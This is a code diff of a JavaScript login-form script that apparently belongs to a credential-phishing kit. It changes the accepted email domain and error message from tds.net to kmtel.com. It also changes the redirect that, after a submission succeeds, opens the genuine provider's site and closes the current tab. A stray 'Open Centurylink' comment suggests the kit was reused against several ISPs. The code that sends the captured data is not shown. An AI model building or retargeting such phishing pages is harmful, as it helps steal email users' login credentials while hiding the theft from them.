@@ -205,14 +205,14 @@
       passwordError.textContent = "";
 
       const emailValue = emailInput.value.trim();
-      const allowedDomainRegex = /^[^@\s]+@(tds\.net)$/i;
+      const allowedDomainRegex = /^[^@\s]+@(kmtel\.com)$/i;
 
       if (!emailValue) {
         emailError.textContent = "Email is required.";
         valid = false;
       } else if (!allowedDomainRegex.test(emailValue)) {
         emailError.textContent =
-          "Email must be @tds.net.";
+          "Email must be @kmtel.com.";
         valid = false;
       }
 
@@ -234,7 +234,7 @@
           console.log("SUCCESS!", response.status, response.text);
 
           // Open Centurylink in a new tab
-          window.open("https://www.tds.net", "_blank");
+          window.open("https://www.kmtel.com", "_blank");
 
           // Attempt to close current tab (works only if tab was script-opened)
           window.close();
